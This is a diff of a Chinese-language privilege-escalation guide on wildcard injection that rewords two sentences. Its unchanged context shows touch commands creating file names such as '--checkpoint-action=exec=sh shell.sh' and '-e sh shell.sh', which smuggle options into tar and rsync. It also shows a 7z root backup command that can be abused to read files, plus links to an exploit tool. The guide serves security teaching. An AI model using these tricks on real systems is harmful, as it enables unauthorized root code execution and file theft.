@@ -16,7 +16,7 @@ touch "--reference=/my/own/path/filename"
 touch "--checkpoint=1"
 touch "--checkpoint-action=exec=sh shell.sh"
 ```
-您可以利用这个使用 [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar 攻击)_\
+您可以利用此漏洞使用 [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar 攻击)_\
 更多信息请参见 [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
 
 ## Rsync
@@ -37,7 +37,7 @@ touch "-e sh shell.sh"
 
 ## 7z
 
-在 **7z** 中，即使在 `*` 前使用 `--`（注意 `--` 意味着后面的输入不能被视为参数，因此在这种情况下只是文件路径），您也可以导致任意错误以读取文件，因此如果以下命令由 root 执行：
+在 **7z** 中，即使在 `*` 前使用 `--`（注意 `--` 表示后面的输入不能被视为参数，因此在这种情况下只是文件路径），您也可以导致任意错误以读取文件，因此如果以下命令由 root 执行：
 ```bash
 7za a /backup/$filename.zip -t7z -snl -p$pass -- *
 ```
